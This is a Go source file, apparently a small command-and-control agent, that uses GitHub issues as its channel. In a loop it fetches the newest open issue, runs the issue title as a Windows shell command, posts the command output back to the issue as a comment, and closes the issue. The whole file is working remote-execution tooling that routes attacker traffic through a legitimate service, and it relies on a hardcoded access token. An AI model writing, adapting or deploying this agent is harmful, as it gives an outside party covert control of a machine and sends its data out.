package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

// GitHub settings
const (
	repoOwner = ""// Change to your GitHub username/org
	repoName  = ""// Change to your repo name
	token     = ""// HARDCODED TOKEN (Replace with your token)
	apiURL    = "https://api.github.com"
)

// Structs for GitHub API response
type Issue struct {
	Number int    `json:"number"`
	Title  string `json:"title"`
	Body   string `json:"body"`
}

type Comment struct {
	Body string `json:"body"`
}

type IssueUpdate struct {
	State string `json:"state"`
}

// Fetch the latest open issue
func getLatestIssue() (Issue, error) {
	url := fmt.Sprintf("%s/repos/%s/%s/issues?state=open&per_page=1", apiURL, repoOwner, repoName)

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", "token "+token)
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return Issue{}, err
	}
	defer resp.Body.Close()

	// Read the response body
	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println("GitHub API Response:", string(body)) // DEBUG: Print full response

	// Check if response is empty or unauthorized
	if resp.StatusCode != 200 {
		return Issue{}, fmt.Errorf("GitHub API error: %s", resp.Status)
	}

	// Parse the JSON response
	var issues []Issue
	err = json.Unmarshal(body, &issues)
	if err != nil {
		return Issue{}, err
	}

	if len(issues) == 0 {
		return Issue{}, fmt.Errorf("no open issues found")
	}

	return issues[0], nil
}

// Execute the command from the issue title
func executeCommand(command string) string {
	cmd := exec.Command("cmd", "/c", command) // Windows
	// cmd := exec.Command("bash", "-c", command) // Linux/macOS [we'll do that later]

	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error executing: %s\n%s", command, err.Error())
	}
	return string(out)
}

// Post command output as a comment
func postComment(issueNumber int, output string) error {
	url := fmt.Sprintf("%s/repos/%s/%s/issues/%d/comments", apiURL, repoOwner, repoName, issueNumber)

	comment := Comment{Body: fmt.Sprintf("```\n%s\n```", output)}
	jsonData, _ := json.Marshal(comment)

	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	req.Header.Set("Authorization", "token "+token)
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 201 {
		return fmt.Errorf("failed to post comment, status: %d", resp.StatusCode)
	}

	return nil
}

// Close the issue after execution
func closeIssue(issueNumber int) error {
	url := fmt.Sprintf("%s/repos/%s/%s/issues/%d", apiURL, repoOwner, repoName, issueNumber)

	update := IssueUpdate{State: "closed"}
	jsonData, _ := json.Marshal(update)

	req, _ := http.NewRequest("PATCH", url, bytes.NewBuffer(jsonData))
	req.Header.Set("Authorization", "token "+token)
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("failed to close issue, status: %d", resp.StatusCode)
	}

	return nil
}

func main() {
	for {
		issue, err := getLatestIssue()
		if err != nil {
			fmt.Println("Error fetching issue:", err)
			time.Sleep(10 * time.Second)
			continue
		}

		command := strings.TrimPrefix(issue.Title, "Command: ")
		fmt.Println("Executing:", command)

		output := executeCommand(command)

		// Post output as a comment
		if err := postComment(issue.Number, output); err != nil {
			fmt.Println("Error posting comment:", err)
		}

		// Close the issue
		if err := closeIssue(issue.Number); err != nil {
			fmt.Println("Error closing issue:", err)
		} else {
			fmt.Println("Issue closed successfully.")
		}

		time.Sleep(20 * time.Second) // Adjust based on need
	}
}
